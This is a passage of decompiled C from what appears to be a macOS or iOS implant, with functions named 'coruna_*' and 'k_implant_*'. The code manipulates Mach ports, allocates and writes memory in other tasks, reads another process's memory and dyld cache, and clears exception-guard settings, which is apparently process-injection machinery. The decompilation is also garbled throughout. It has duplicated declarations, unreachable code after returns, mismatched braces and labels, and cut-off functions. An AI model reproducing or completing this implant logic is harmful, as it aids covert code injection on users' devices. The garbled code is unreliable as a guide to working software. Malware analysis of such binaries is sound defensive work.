    cache_20 = 0;
    cache = 0;
    cache = 0;
    work = 0;
    work = 0;
    frame = 0;
    frame = 0;
    json_buf = 0;
    json_buf = 0;
    url_buf = 0;
    url_buf = 0;
    plist = 0;
    plist = 0;
    region = 0;
    region = 0;
    tmp_buf = 0;
    tmp_buf = 0;
    path_buf = 0;
    path_buf = 0;
    sa_new = 0;
    stack_guard = 0;
    sa_saved = 0;
    sa_new = 0;
    host_info = 0;
    serial_buf = 0;
    action = 0;
    block_ctx = 0;
    stack_guard = 0;
    serial_buf = 0;
    action = 0;
    host_info = k_implant_rodata_word_1e920;
    block_ctx = -5;
    sa_saved = SUB84(str,0);
    host_info = port;
    if ((int)buf != 0) {
      sa_new = (int)buf;
      ___memcpy_chk(&path_buf,&scratch,(unsigned long)buf & 0xffffffff,0x100);
    }
    if (1 < (int)buf + 1U) {
      host_info = host_info | 0x80000000;
      stack_guard = 1;
      host_info = SUB81(buf,0);
      serial_buf = (uint8_t)((unsigned long)buf >> 8);
      action = (uint16_t)((unsigned long)buf >> 0x10);
      sa_saved = 0x13;
    }
    _mach_msg((mach_msg_header_t *)host_info,0x11,0x134,0,0,0,0);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != cache_26) {
    ___stack_chk_fail();
  }
  return str;
}





unsigned long coruna_mach_port_deallocate_1adbc(mach_port_name_t *arg)

{
  uint8_t *entry_9;
  kern_return_t lk2;
  uint type_id_8;
  unsigned long version;
  uint port;
  
  if (arg == (mach_port_name_t *)0x0) {
    version = 0xad001;
  }
  else {
    version = coruna_pthread_join();
    entry_9 = k_implant_mach_task_self_slot;
    if (1 < *arg + 1) {
      lk2 = _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,*arg);
      port = (uint)version;
      type_id_8 = 0x1e024;
      if (port != 0) {
        type_id_8 = port;
      }
      if (lk2 != 0) {
        port = type_id_8;
      }
      lk2 = _mach_port_mod_refs(*(ipc_space_t *)entry_9,*arg,1,-1);
      type_id_8 = 0x1e024;
      if (port != 0) {
        type_id_8 = port;
      }
      if (lk2 != 0) {
        port = type_id_8;
      }
      version = (unsigned long)port;
    }
    if ((*(long *)(arg + 6) != 0) && (*(long *)(arg + 8) != 0)) {
      type_id_8 = (**(void (**)(*(long *)(arg + 6) + 0x20))();
      if ((uint)version != 0) {
        type_id_8 = (uint)version;
      }
      version = (unsigned long)type_id_8;
    }
    arg[6] = 0;
    arg[7] = 0;
    arg[4] = 0;
    arg[5] = 0;
    arg[10] = 0;
    arg[0xb] = 0;
    arg[8] = 0;
    arg[9] = 0;
    arg[2] = 0;
    arg[3] = 0;
    arg[0] = 0;
    arg[1] = 0;
    _free(arg);
  }
  return version;
}





uint64_t coruna_pthread_join(long handle)
{
  int err;
  uint64_t u;
  void *scratch;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if (*(char *)(handle + 8) == '\0') {
    u = 0;
  }
  else {
    *(uint8_t *)(handle + 9) = 1;
    if (*(long *)(handle + 0x18) != 0) {
      coruna_mach_msg_destroy_1b0cc(handle);
      scratch = (void *)0x0;
      err = _pthread_join(*(pthread_t *)(handle + 0x10),&scratch);
      if (err == 0) {
        coruna_mach_msg_destroy_1b0cc(handle);
      }
      else {
        ___error();
      }
      *(uint64_t *)(handle + 0x10) = 0;
    }
    u = 0;
    *(uint8_t *)(handle + 8) = 0;
  }
  return u;
}





unsigned long coruna_mach_port_set_attributes_1af18(uint64_t *arg,long val)

{
  uint8_t *entry_9;
  mach_port_name_t name;
  uint size;
  kern_return_t lk3;
  mach_port_name_t lm4;
  int count;
  mach_port_name_t *lpm6;
  unsigned long kind;
  uint64_t cache;
  mach_port_name_t cache_20 [2];
  
  if (arg == (uint64_t *)0x0) {
    return 0xad001;
  }
  lpm6 = _calloc(1,0x30);
  if (lpm6 == (mach_port_name_t *)0x0) {
    return 0xad009;
  }
  cache = 0;
  if (val == 0) {
load_ok_60:
    kind = 0;
    *arg = lpm6;
  }
  else {
    kind = (**(void (**)(val + 0x18))(val,0,&cache);
    entry_9 = k_implant_mach_task_self_slot;
    if ((int)kind == 0) {
      cache_20[0] = 0;
      size = _mach_port_allocate(*(ipc_space_t *)k_implant_mach_task_self_slot,1,cache_20);
      name = cache_20[0];
      if (size == 0) {
        cache_20[0] = 1;
        lk3 = _mach_port_set_attributes
                          (*(ipc_space_t *)entry_9,name,1,(mach_port_info_t)cache_20,1);
        if ((lk3 == 0) &&
           (lk3 = _mach_port_insert_right(*(ipc_space_t *)entry_9,name,name,0x14), lk3 == 0)) {
          *lpm6 = name;
          lm4 = coruna_srandomdev();
          lpm6[1] = lm4;
          *(uint16_t *)(lpm6 + 2) = 0x100;
          lpm6[4] = 0;
          lpm6[5] = 0;
          *(long *)(lpm6 + 6) = val;
          *(uint64_t *)(lpm6 + 8) = cache;
          count = coruna_mach_msg_destroy_1b0cc(lpm6);
          if (count == 0) goto load_ok_60;
          _mach_port_mod_refs(*(ipc_space_t *)entry_9,name,0,-1);
        }
        _mach_port_destroy(*(ipc_space_t *)entry_9,name);
        size = 0x1e023;
      }
      else {
        size = size | 0x80000000;
      }
      kind = (unsigned long)size;
      (**(void (**)(val + 0x20))(val,cache);
    }
    _free(lpm6);
  }
  return kind;
}





uint coruna_srandomdev(void)
{
  uint u;
  unsigned long size;
  
  _srandomdev();
  size = _random();
  u = (uint)size;
  if ((size & 0x7fffffff) == 0) {
    size = _random();
    u = (int)k_implant_dlsym_slot << 0xe ^ 0x6c20;
    if ((size & 0x7fffffff) != 0) {
      u = (uint)size;
    }
  }
  return u & 0x7fffffff;
}





uint32_t coruna_mach_msg_destroy_1b0cc(mach_port_t *port)
{
  mach_msg_return_t lm1;
  mach_msg_header_t scratch;
  
  if (port == (mach_port_t *)0x0) {
    return 0xad001;
  }
  if (*(long *)(port + 6) != 0) {
    scratch.msgh_local_port = 0;
    scratch.msgh_reserved = 0;
    scratch.msgh_remote_port = *port;
    scratch.msgh_id = port[1];
    scratch = k_implant_rodata_word_1e938;
    lm1 = _mach_msg(&scratch,0x11,0x18,0,0,1,0);
    if (lm1 == 0) {
      return 0;
    }
    if (lm1 != 0x10000004) {
      return 0x1e025;
    }
    _mach_msg_destroy(&scratch);
  }
  return 0;
}





uint8_t * coruna_pthread_create(uint32_t *size,uint32_t *flags_2,uint32_t *version_3)
{
  int err;
  uint8_t *ptr;
  
  if (size == (uint32_t *)0x0) {
    ptr = (uint8_t *)0xad001;
  }
  else if (((*(char *)(size + 2) == '\0') &&
           (*(uint16_t *)(size + 2) = 1, *(long *)(size + 6) != 0)) &&
          (err = _pthread_create((pthread_t *)(size + 4),(pthread_attr_t *)0x0,
                                   (void **)coruna_mach_msg_1b208,size), err != 0)) {
    ___error();
    *(uint8_t *)(size + 2) = 0;
    *(uint64_t *)(size + 4) = 0;
    ptr = &k_implant_rodata_word_1e01f;
  }
  else {
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = *size;
    }
    ptr = (uint8_t *)0x0;
    if (version_3 != (uint32_t *)0x0) {
      *version_3 = size[1];
    }
  }
  return ptr;
}





uint64_t coruna_mach_msg_1b208(mach_port_name_t *arg)
{
  size_t ls1;
  mach_port_name_t rcv_name;
  mach_msg_return_t lm2;
  int err;
  mach_msg_header_t *msg;
  mach_msg_header_t *msg_00;
  
  if ((arg != (mach_port_name_t *)0x0) &&
     (msg = _calloc(1,0x13c), msg != (mach_msg_header_t *)0x0)) {
    do {
      while( true ) {
        if ((*(char *)((long)arg + 9) != '\0') || (rcv_name = *arg, rcv_name + 1 < 2))
        goto fail;
        msg[0xb].msgh_reserved = 0;
        msg[0xb].msgh_id = 0;
        msg[0xb].msgh_remote_port = 0;
        msg[0xb].msgh_local_port = 0;
        msg[0xc].msgh_remote_port = 0;
        msg[0xc].msgh_local_port = 0;
        msg[0xc].msgh_bits = 0;
        msg[0xc].msgh_size = 0;
        msg[10].msgh_remote_port = 0;
        msg[10].msgh_local_port = 0;
        msg[10].msgh_bits = 0;
        msg[10].msgh_size = 0;
        msg[0xb].msgh_bits = 0;
        msg[0xb].msgh_size = 0;
        msg[10].msgh_reserved = 0;
        msg[10].msgh_id = 0;
        msg[9].msgh_bits = 0;
        msg[9].msgh_size = 0;
        msg[8].msgh_reserved = 0;
        msg[8].msgh_id = 0;
        msg[9].msgh_reserved = 0;
        msg[9].msgh_id = 0;
        msg[9].msgh_remote_port = 0;
        msg[9].msgh_local_port = 0;
        msg[7].msgh_reserved = 0;
        msg[7].msgh_id = 0;
        msg[7].msgh_remote_port = 0;
        msg[7].msgh_local_port = 0;
        msg[8].msgh_remote_port = 0;
        msg[8].msgh_local_port = 0;
        msg[8].msgh_bits = 0;
        msg[8].msgh_size = 0;
        msg[6].msgh_remote_port = 0;
        msg[6].msgh_local_port = 0;
        msg[6].msgh_bits = 0;
        msg[6].msgh_size = 0;
        msg[7].msgh_bits = 0;
        msg[7].msgh_size = 0;
        msg[6].msgh_reserved = 0;
        msg[6].msgh_id = 0;
        msg[5].msgh_bits = 0;
        msg[5].msgh_size = 0;
        msg[4].msgh_reserved = 0;
        msg[4].msgh_id = 0;
        msg[5].msgh_reserved = 0;
        msg[5].msgh_id = 0;
        msg[5].msgh_remote_port = 0;
        msg[5].msgh_local_port = 0;
        msg[3].msgh_reserved = 0;
        msg[3].msgh_id = 0;
        msg[3].msgh_remote_port = 0;
        msg[3].msgh_local_port = 0;
        msg[4].msgh_remote_port = 0;
        msg[4].msgh_local_port = 0;
        msg[4].msgh_bits = 0;
        msg[4].msgh_size = 0;
        msg[2].msgh_remote_port = 0;
        msg[2].msgh_local_port = 0;
        msg[2].msgh_bits = 0;
        msg[2].msgh_size = 0;
        msg[3].msgh_bits = 0;
        msg[3].msgh_size = 0;
        msg[2].msgh_reserved = 0;
        msg[2].msgh_id = 0;
        msg[1].msgh_bits = 0;
        msg[1].msgh_size = 0;
        msg->msgh_reserved = 0;
        msg->msgh_id = 0;
        msg[1].msgh_reserved = 0;
        msg[1].msgh_id = 0;
        msg[1].msgh_remote_port = 0;
        msg[1].msgh_local_port = 0;
        msg->msgh_remote_port = 0;
        msg->msgh_local_port = 0;
        msg->msgh_bits = 0;
        msg->msgh_size = 0;
        *(uint64_t *)&msg[0xc].msgh_id = 0;
        msg[0xc].msgh_local_port = 0;
        msg[0xc].msgh_reserved = 0;
        lm2 = _mach_msg(msg,0x106,0,0x13c,rcv_name,10000,0);
        if (lm2 == 0x10004004) break;
        if (lm2 == 0) {
          coruna_mach_port_get_refs(arg,msg,0x13c);
          lm2 = 0;
        }
done:
        err = coruna_mach_msg_destroy_1b580(lm2,msg,0x13c);
        if (err != 0) goto fail;
      }
      if (0x1fffe8 < msg->msgh_size - 0x18) {
        lm2 = _mach_msg(msg,2,0,0x13c,*arg,0,0);
        goto done;
      }
      ls1 = (unsigned long)msg->msgh_size + 8;
      msg_00 = _calloc(1,ls1);
      if (msg_00 == (mach_msg_header_t *)0x0) break;
      lm2 = _mach_msg(msg_00,2,0,(mach_msg_size_t)ls1,*arg,0,0);
      if (lm2 == 0) {
        coruna_mach_port_get_refs(arg,msg_00,ls1);
        lm2 = 0;
      }
      err = coruna_mach_msg_destroy_1b580(lm2,msg_00,ls1);
      _free(msg_00);
    } while (err == 0);
fail:
    _free(msg);
  }
  return 0;
}





void coruna_mach_port_get_refs(long handle,int *flags,uint size)
{
  long handle;
  uint u;
  int err;
  uint size;
  mach_port_urefs_t lm5;
  kern_return_t lk6;
  mach_port_urefs_t lm7;
  int status;
  uint version;
  mach_port_urefs_t *lpm10;
  mach_port_urefs_t scratch;
  uint bootargs;
  
  if (((handle != 0) && (flags != (int *)0x0)) && (0x17 < size)) {
    err = flags[5];
    size = *(uint *)(handle + 4);
    if ((unsigned long)size <= (unsigned long)(long)err && (unsigned long)(long)err < (unsigned long)size + 0xc) {
      u = flags[1];
      version = 0x18;
      if (*flags < 0) {
        version = 0x2c;
      }
      if (version <= u && u < size) {
        if (*flags < 0) {
          if (flags[6] != 1) {
            return;
          }
          lpm10 = *(mach_port_urefs_t **)(flags + 7);
          if ((uint)flags[9] >> 0x18 == 0) {
            if ((mach_port_name_t)lpm10 + 1 < 2) {
              return;
            }
            scratch = 0;
            lk6 = _mach_port_get_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                        (mach_port_name_t)lpm10,0,&scratch);
            if (lk6 != 0) {
              return;
            }
            if (scratch == 0) {
              return;
            }
          }
          else {
            if ((uint)flags[9] >> 0x18 != 1) {
              return;
            }
            if (lpm10 == (mach_port_urefs_t *)0x0) {
              return;
            }
            if (flags[10] != 4) {
              return;
            }
            lm5 = *lpm10;
            lm7 = _getpid();
            if (lm5 == lm7) {
              lpm10 = (mach_port_urefs_t *)(unsigned long)*(uint *)k_implant_mach_task_self_slot;
            }
            else {
              if ((*(mach_port_urefs_t *)(handle + 0x28) == lm5) &&
                 (1 < *(mach_port_name_t *)(handle + 0x2c) + 1)) {
                scratch = 0;
                lk6 = _mach_port_get_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                            *(mach_port_name_t *)(handle + 0x2c),0,&scratch);
                lpm10 = (mach_port_urefs_t *)0x0;
                status = 0x1e020;
                if ((lk6 == 0) && (scratch != 0)) {
                  status = 0;
                  lpm10 = (mach_port_urefs_t *)(unsigned long)*(uint *)(handle + 0x2c);
                }
              }
              else {
                bootargs = 0;
                scratch = lm5;
                status = (**(void (**)(*(long *)(handle + 0x18) + 0x28))
                                  (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),
                                   0xc000001d,&scratch);
                lpm10 = (mach_port_urefs_t *)0x0;
                if (status == 0) {
                  lpm10 = (mach_port_urefs_t *)(unsigned long)bootargs;
                  *(mach_port_urefs_t *)(handle + 0x28) = lm5;
                  *(uint *)(handle + 0x2c) = bootargs;
                }
              }
              if (status != 0) {
                return;
              }
            }
          }
        }
        else {
          lpm10 = (mach_port_urefs_t *)0x0;
        }
        handle = 0;
        if (u - version != 0) {
          handle = (long)flags + (unsigned long)version;
        }
        coruna_mach_msg(handle,err - size,handle,u - version,lpm10,flags[2]);
      }
    }
  }
  return;
}





uint8_t * coruna_mach_msg_destroy_1b580(int flags,mach_msg_header_t *arg,uint size)
{
  uint u;
  uint size;
  uint8_t *ptr;
  
  if (arg == (mach_msg_header_t *)0x0) {
    return (uint8_t *)0xad001;
  }
  if (size == 0) {
    return (uint8_t *)0xad001;
  }
  u = flags + 0xefffbffe;
  if (u < 0xb) {
    size = 1 << (unsigned long)(u & 0x1f);
    if ((size & 0x22e) == 0) {
      if ((size & 0x91) != 0) {
        ptr = &k_implant_rodata_word_1e01b;
        _bzero(arg,(unsigned long)size);
        return ptr;
      }
      if (flags != 0) {
      ptr = &k_implant_rodata_word_1e021;
      _bzero(arg,(unsigned long)size);
      return ptr;
      }
      goto cleanup;
    }
  }
  else {
done:
    if (flags != 0) {
      ptr = &k_implant_rodata_word_1e021;
      _bzero(arg,(unsigned long)size);
      return ptr;
    }
cleanup:
    arg->msgh_remote_port = 0;
    _mach_msg_destroy(arg);
  }
  ptr = (uint8_t *)0x0;
fail:
  _bzero(arg,(unsigned long)size);
  return ptr;
}





uint coruna_task_get_exc_guard_behavior(uint64_t val)
{
  uint u;
  uint size;
  uint scratch;
  
  u = 0xad001;
  if ((1 < (int)val + 1U) &&
     (u = 0,
     k_implant_task_get_exc_guard_behavior_slot != (uint8_t *)0x0 &&
     k_implant_task_set_exc_guard_behavior_slot != (uint8_t *)0x0)) {
    scratch = 0;
    u = _task_get_exc_guard_behavior(val,&scratch);
    if (u == 0) {
      if ((scratch & 0x88) == 0) {
        u = 0;
      }
      else {
        scratch = scratch & 0xffffff77;
        size = _task_set_exc_guard_behavior(val);
        u = 0;
        if (size != 0) {
          u = size | 0x80000000;
        }
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
  return u;
}





uint32_t coruna_mach_port_kernel_object(uint64_t val)
{
  mach_port_name_t name;
  bool err;
  ipc_space_t task;
  kern_return_t lk2;
  long handle;
  mach_msg_type_number_t lm4;
  uint32_t u;
  int err;
  uint size;
  unsigned long version;
  uint scratch;
  uint bootargs;
  mach_msg_type_number_t thread_attr;
  ipc_info_tree_name_array_t host_info;
  mach_msg_type_number_t serial_buf;
  ipc_info_name_array_t action;
  ipc_info_space_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  kern_return_t path_buf;
  
  u = 0xad025;
  task = (ipc_space_t)val;
  if (task + 1 < 2) {
    u = 0xad001;
  }
  else {
    path_buf = 5;
    stack_guard = 0;
    sa_saved = 0;
    sa_new = 0;
    err = 0x19;
    do {
      handle = __dyld_process_info_create(val,0,&path_buf);
      if (handle != 0) {
        sa_saved = 0;
        stack_guard = 0;
        sa_new = 0xff;
        __dyld_process_info_get_state(handle,&stack_guard);
        size = (uint)(byte)sa_new;
        if (size - 0x30 < 0x21) {
          __dyld_process_info_release(handle);
          return 0;
        }
        __dyld_process_info_release(handle);
        if (size == 0) {
          return 0xad025;
        }
        break;
      }
      _usleep(100000);
      err = err + -1;
    } while (err != 0);
    block_ctx.iis_genno_mask = 0;
    block_ctx.iis_table_size = 0;
    block_ctx.iis_table_next = 0;
    block_ctx.iis_tree_size = 0;
    block_ctx.iis_tree_small = 0;
    block_ctx.iis_tree_hash = 0;
    action = (ipc_info_name_array_t)0x0;
    serial_buf = 0;
    host_info = (ipc_info_tree_name_array_t)0x0;
    thread_attr = 0;
    lk2 = _mach_port_space_info(task,&block_ctx,&action,&serial_buf,&host_info,&thread_attr);
    if (lk2 == 0) {
      path_buf = 0;
      if (serial_buf != 0) {
        handle = 0;
        err = false;
        version = 1;
        lm4 = serial_buf;
        do {
          scratch = 0;
          bootargs = 0;
          name = *(mach_port_name_t *)((long)&action->iin_name + handle);
          if (1 < name + 1) {
            path_buf = _mach_port_kernel_object(task,name,&bootargs,&scratch);
            err = (bool)((path_buf == 0 && bootargs == 0x19) | err);
            lm4 = serial_buf;
          }
          if (lm4 <= version) break;
          version = version + 1;
          handle = handle + 0x1c;
        } while (!err);
        u = 0;
        if (!err) {
          u = 0xad025;
        }
        if ((action != (ipc_info_name_array_t)0x0) && (lm4 != 0)) {
          _mach_vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,(mach_vm_address_t)action
                              ,(unsigned long)lm4 * 0x1c);
        }
      }
      if ((host_info != (ipc_info_tree_name_array_t)0x0) && (thread_attr != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,(mach_vm_address_t)host_info,
                            (unsigned long)thread_attr * 0x24);
      }
    }
  }
  return u;
}





uint8_t * coruna_mach_vm_allocate(uint64_t val,mach_vm_size_t arg,int flags,mach_vm_address_t *arg_x)
{
  vm_map_t target;
  kern_return_t lk1;
  uint8_t *ptr;
  mach_vm_address_t scratch;
  
  ptr = (uint8_t *)0xad001;
  if ((arg_x != (mach_vm_address_t *)0x0) && (arg != 0)) {
    ptr = &k_implant_rodata_word_1e009;
    target = (vm_map_t)val;
    if (1 < target + 1) {
      scratch = 0;
      lk1 = _mach_vm_allocate(target,&scratch,arg,flags);
      if (lk1 == 0) {
        lk1 = _mach_vm_protect(target,scratch,arg,0,3);
        if (lk1 == 0) {
          ptr = (uint8_t *)0x0;
          *arg_x = scratch;
        }
        else {
          coruna_mach_vm_deallocate_1b998(val,scratch,arg,0);
          ptr = &k_implant_rodata_word_1e00d;
        }
      }
      else {
        ptr = &k_implant_rodata_word_1e00a;
      }
    }
  }
  return ptr;
}





uint32_t coruna_mach_vm_deallocate_1b998(uint64_t val,mach_vm_address_t arg,unsigned long arg_x,int flags)
{
  kern_return_t lk1;
  uint32_t u;
  
  if ((arg == 0) && ((int)arg_x != 0)) {
    u = 0xad001;
  }
  else {
    u = 0x1e009;
    if ((1 < (vm_map_t)val + 1) && (u = 0, (int)arg_x != 0)) {
      if (flags != 0) {
        coruna_mach_vm_write(val,arg,arg_x);
      }
      lk1 = _mach_vm_deallocate((vm_map_t)val,arg,arg_x & 0xffffffff);
      u = 0;
      if (lk1 != 0) {
        u = 0x1e00b;
      }
    }
  }
  return u;
}





uint8_t * coruna_sysctlnametomib(mach_port_name_t arg,uint32_t *size,uint *size_x)
{
  kern_return_t lk1;
  int err;
  uint u;
  uint64_t *ptr;
  uint8_t *buf;
  size_t scratch;
  size_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  int action [14];
  long block_ctx;
  
  block_ctx = *(long *)k_implant_stack_chk_guard_slot;
  serial_buf = 0;
  if (arg + 1 < 2 || size == (uint32_t *)0x0) {
    buf = (uint8_t *)0xad001;
  }
  else {
    buf = &k_implant_rodata_word_1e002;
    lk1 = _pid_for_task(arg,(int *)((long)&serial_buf + 4));
    if (lk1 == 0) {
      host_info = 0;
      scratch = 0;
      thread_attr = 0;
      thread_attr = 0;
      bootargs = 0;
      err = _proc_pidinfo(serial_buf,0x13,0,&thread_attr,8);
      if (err == 8) {
        ptr = &thread_attr;
        u = thread_attr & 0xffffff;
      }
      else {
        action[6] = 0;
        action[7] = 0;
        action[4] = 0;
        action[5] = 0;
        action[10] = 0;
        action[0xb] = 0;
        action[8] = 0;
        action[9] = 0;
        action[2] = 0;
        action[3] = 0;
        action[0] = 0;
        action[1] = 0;
        bootargs = 0xc;
        err = _sysctlnametomib("sysctl.proc_cputype",action,&bootargs);
        if (*(long *)k_implant_stack_chk_guard_slot == block_ctx) {
        return buf;
        }
        ___stack_chk_fail();
        action[bootargs] = serial_buf;
        bootargs = bootargs + 1;
        scratch = 4;
        err = _sysctl(action,(u_int)bootargs,&serial_buf,&scratch,(void *)0x0,0);
        if (*(long *)k_implant_stack_chk_guard_slot == block_ctx) {
        return buf;
        }
        ___stack_chk_fail();
        u = 0;
        ptr = &serial_buf;
      }
      *size = *(uint32_t *)ptr;
      buf = (uint8_t *)0x0;
      if (size_x != (uint *)0x0) {
        *size_x = u;
      }
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == block_ctx) {
    return buf;
  }
  ___stack_chk_fail();
}





uint64_t coruna_mach_vm_read_overwrite_1bb8c(uint64_t val,long *handle,uint64_t id_2)
{
  bool err;
  task_name_t target_task;
  long handle;
  uint64_t u;
  long addr;
  bool status;
  mach_vm_size_t scratch;
  mach_msg_type_number_t bootargs;
  mach_vm_address_t thread_attr [2];
  uint32_t host_info;
  kern_return_t serial_buf;
  uint64_t action;
  uint64_t scratch;
  long block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t path_buf;
  uint64_t stack_guard;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t region;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  long plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t url_buf;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t json_buf;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t frame;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t work;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  long cache_20;
  
  cache_20 = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  target_task = (task_name_t)val;
  if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
  return u;
  }
  ___stack_chk_fail();
  thread_attr[0] = 0;
  thread_attr[1] = 0;
  host_info = 0;
  bootargs = 5;
  serial_buf = _task_info(target_task,0x11,(task_info_t)thread_attr,&bootargs);
  if ((serial_buf == 0) && (thread_attr[0] != 0)) {
    cache_30 = 0;
    cache = 0;
    cache_32 = 0;
    cache_31 = 0;
    cache_27 = 0;
    work = 0;
    cache_29 = 0;
    cache_28 = 0;
    cache_24 = 0;
    frame = 0;
    cache_26 = 0;
    cache_25 = 0;
    cache_21 = 0;
    json_buf = 0;
    cache_23 = 0;
    cache_22 = 0;
    work = 0;
    url_buf = 0;
    cache_20 = 0;
    cache = 0;
    url_buf = 0;
    plist = 0;
    frame = 0;
    json_buf = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    region = 0;
    sa_saved = 0;
    tmp_buf = 0;
    path_buf = 0;
    sa_new = 0;
    stack_guard = 0;
    path_buf = 0;
    serial_buf = 0;
    sa_new = 0;
    block_ctx = 0;
    action = 0;
    bootargs = 0;
    sa_saved = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    action = 0;
    stack_guard = 0;
    block_ctx = 0;
    scratch = 0;
    serial_buf = _mach_vm_read_overwrite
                          (target_task,thread_attr[0],0x170,(mach_vm_address_t)&action,&scratch);
    handle = __dyld_process_info_create(val,0,&serial_buf);
    if (handle != 0) {
    scratch = 0;
    action = 0;
    stack_guard = 0;
    block_ctx = 0;
    __dyld_process_info_get_cache(handle,&action);
    status = block_ctx != 0 && (char)stack_guard == '\0';
    addr = block_ctx;
    if (block_ctx == 0 || (char)stack_guard != '\0') {
    addr = 0;
    }
    __dyld_process_info_release(handle);
    err = addr == 0;
    u = 0xad022;
    if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = false;
    }
    u = 0;
    *handle = addr;
    *(bool *)id_2 = status;
    if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = true;
    addr = plist;
cleanup:
    err = addr == 0;
    u = 0xad022;
    if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = false;
    }
    u = 0;
    *handle = addr;
    *(bool *)id_2 = status;
    fail:
    if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
    return u;
  }
  else {
done:
    handle = __dyld_process_info_create(val,0,&serial_buf);
    if (handle != 0) {
      scratch = 0;
      action = 0;
      stack_guard = 0;
      block_ctx = 0;
      __dyld_process_info_get_cache(handle,&action);
      status = block_ctx != 0 && (char)stack_guard == '\0';
      addr = block_ctx;
      if (block_ctx == 0 || (char)stack_guard != '\0') {
        addr = 0;
      }
      __dyld_process_info_release(handle);
      err = addr == 0;
      u = 0xad022;
      if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
      return u;
      }
      ___stack_chk_fail();
      status = false;
      }
      u = 0;
      *handle = addr;
      *(bool *)id_2 = status;
      fail:
      if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
      return u;
    }
    status = false;
    addr = 0;
    err = true;
check_ok:
    u = 0xad022;
    if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = false;
  }
  u = 0;
  *handle = addr;
  *(bool *)id_2 = status;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_dladdr_1bd4c(uint64_t val,long handle,long *addr_2)
{
  int err;
  uint64_t u;
  long handle;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  char *block_ctx;
  long stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint8_t region;
  uint64_t plist;
  uint64_t *url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint32_t work;
  char *cache;
  long cache_20;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  u = 0xad001;
  if (((1 < (int)val + 1U) && (handle != 0)) && (addr_2 != (long *)0x0)) {
    cache_20 = 0;
    cache = (char *)0x0;
    thread_attr = 0;
    bootargs = 0;
    err = _dladdr(handle,&cache);
    if (err == 0) {
      u = 0xad00b;
    }
    else {
      u = 0xad014;
      if ((cache != (char *)0x0) && (*cache != '\0' && cache_20 != 0)) {
        work = 5;
        handle = __dyld_process_info_create(val,0,&work);
        u = 0xad00b;
        if (handle != 0) {
          action = &plist;
          plist = 0;
          json_buf = k_implant_rodata_word_1e8c0;
          frame = 0;
          serial_buf = &sa_new;
          sa_new = 0;
          tmp_buf = k_implant_rodata_word_1e8c0;
          region = 0;
          scratch = k_implant_nsconcretestackblock_slot;
          bootargs = k_implant_rodata_word_1e8c8;
          thread_attr = coruna_wire_bind_sym;
          host_info = &k_implant_rodata_word_20560;
          stack_guard = cache_20;
          block_ctx = cache;
          scratch = thread_attr;
          sa_saved = bootargs;
          path_buf = serial_buf;
          url_buf = action;
          __dyld_process_info_for_each_image(handle,&scratch);
          u = 0xad011;
          if ((*(char *)(path_buf + 3) != '\0') && (url_buf[3] != 0)) {
            u = 0;
            *addr_2 = (url_buf[3] + handle) - cache_20;
          }
          __dyld_process_info_release(handle);
          __Block_object_dispose(&sa_new,8);
          __Block_object_dispose(&plist,8);
        }
      }
    }
  }
  return u;
}





void coruna_wire_bind_sym(long handle,uint64_t val,uint64_t id_2,char *path)
{
  int err;
  
  if (((*(char *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) == '\0' && path != (char *)0x0
       ) && (*path != '\0')) && (err = _strcmp(path,*(char **)(handle + 0x30)), err == 0)
     ) {
    *(uint64_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = val;
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  }
  return;
}





void coruna_block_assign_1bf3c(long handle,long addr_2)
{
